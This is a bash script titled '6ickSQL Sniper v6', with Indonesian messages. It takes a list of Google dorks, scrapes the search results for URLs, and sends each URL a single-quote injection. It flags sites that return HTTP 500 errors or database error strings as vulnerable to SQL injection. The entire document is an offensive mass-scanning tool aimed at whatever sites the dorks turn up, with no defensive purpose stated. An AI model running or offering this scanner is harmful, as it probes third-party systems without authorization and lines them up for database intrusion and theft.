
#!/bin/bash
# 6ickSQL Sniper v6 ULTIMATE HUNTER
# By 0x6ick (2025)

banner() {
clear
echo "███████╗██╗ ██████╗██╗  ██╗███████╗██╗     "
echo "██╔════╝██║██╔════╝██║ ██╔╝██╔════╝██║     "
echo "█████╗  ██║██║     █████╔╝ █████╗  ██║     "
echo "██╔══╝  ██║██║     ██╔═██╗ ██╔══╝  ██║     "
echo "██║     ██║╚██████╗██║  ██╗███████╗███████╗"
echo "╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝"
echo "          6ickSQL Sniper v6"
echo "        (ULTIMATE HUNTER MODE)"
echo
}

banner

read -p "Masukkan file dork list (ex: dork.txt): " dorklist
echo "[+] Scan dimulai..."
echo "[+] Hasil disimpan di hasil.txt, suspect.txt, vuln.txt"
echo "" > hasil.txt
echo "" > suspect.txt
echo "" > vuln.txt

while read -r dork; do
  echo "[*] Dork: $dork"
  search=$(curl -s -A "Mozilla/5.0" "https://www.google.com/search?q=${dork}&num=100" | grep -oP 'http[s]?://[^&"]+')
  for url in $search; do
    echo "$url" | tee -a hasil.txt
    inject=$(curl -s -A "Mozilla/5.0" "${url}'")

    # Detect suspect (HTTP 500 error)
    status=$(curl -s -o /dev/null -w "%{http_code}" "${url}'")
    if [[ "$status" == "500" ]]; then
      echo "[!] Suspect 500 error: $url" | tee -a suspect.txt
    fi

    # Detect vuln keywords
    if echo "$inject" | grep -qE "You have an error in your SQL syntax|mysql_fetch_array|ODBC Drivers Error|ORA-00933"; then
      echo "[!!!] VULN CONFIRMED: $url" | tee -a vuln.txt
    fi

  done
done < "$dorklist"

echo ""
echo "[+] Selesai bro! Cek hasil.txt, suspect.txt, dan vuln.txt"
